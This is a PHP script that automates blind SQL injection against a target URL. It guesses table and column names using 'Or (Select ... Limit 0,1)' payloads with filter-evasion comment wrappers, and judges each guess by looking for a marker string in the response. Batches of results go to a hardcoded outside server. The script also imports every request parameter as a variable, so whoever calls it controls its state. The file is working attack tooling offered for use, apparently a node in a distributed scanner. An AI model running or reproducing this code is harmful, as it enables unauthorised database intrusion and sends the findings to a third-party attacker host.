<?php
	set_time_limit(0);
	$server = "http://viet.ug/yy/version4.php";

	foreach($_REQUEST as $key => $value)
	{
		${$key} = $value;
	}
	
	$url = str_replace("xxx1","&",$url);
	$url = str_replace("\\","",$url);
	$string = str_replace("xxx3","&",$string);

	
	$arrSecBypass = array (
	array("",""),
	array("/*!","*/")
	);
	$arrCommentBypass = array("",
	"--" => "--",
	"/*" => "/*",
	"b" => "+--++",
	"a" => "And%20'1'='1"
	);

	function get_page($url)	
	{
		$ch=curl_init();
		$agent = "Mozilla/5.0 (Windows; ?; Windows NT 5.1; *rv:*) Gecko/* Firefox/0.9*";
	curl_setopt($ch,CURLOPT_USERAGENT,$agent);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch,CURLOPT_URL,$url);
		curl_setopt($ch,CURLOPT_TIMEOUT,15);
		$page=curl_exec($ch);
		curl_close($ch);
		return $page;
	}
	if($op == 3)
	{
		$i = 0;
		while(${"_listTable".$i} != "")
		{
			$_listTable .= "xxx3".${"_listTable".$i};
			$i++;
		}
		$arrTable = explode("xxx3",$_listTable);
		$i = 1;$result = "";
		foreach($arrTable as $x)
			{
				$_url = $url.$arrSecBypass[$secBypass][0]."%20Or%20(Select%201%20From%20".$x."%20Limit%200,1)%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
				$page = get_page($_url);
				if(strpos($page,$string))
				{
					$result .= $x."|OKKKKKKKKKKKKKK^.^hoangduye";
					$i++;
				}
				else
				{
					$result .= $x."|NO~!~hoangduye";
					$i++;				
				}
				if($i == 5 || $x == $arrTable[count($arrTable)-1])
				{
					get_page($server."?log=".$log."&result=".$result);
					$i = 1;$result = "";
				}
			}
	}
	elseif($op == 4)
	{
		$i = 0;
		while(${"_listColumn".$i} != "")
		{
			$_listColumn .= "xxx3".${"_listColumn".$i};
			$i++;
		}
		$arrColumn = explode("xxx3",$_listColumn);
		$i = 1;$result = "";
		foreach($arrColumn as $x)
			{
				$_url = $url.$arrSecBypass[$secBypass][0]."%20Or%20(Select%20".$x."%20From%20".$tableBlind."%20Limit%200,1)%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
				$page = get_page($_url);
				if(strpos($page,$string))
				{
					$result .= $x."|OKKKKKKKKKKKKKK^.^hoangduye";
					$i++;
				}
				else
				{
					$result .= $x."|NO~!~hoangduye";
					$i++;				
				}
				if($i == 5 || $x == $arrColumn[count($arrColumn)-1])
				{
					get_page($server."?log=".$log."&result=".$result);
					$i = 1;$result = "";
				}
			}
	}
?>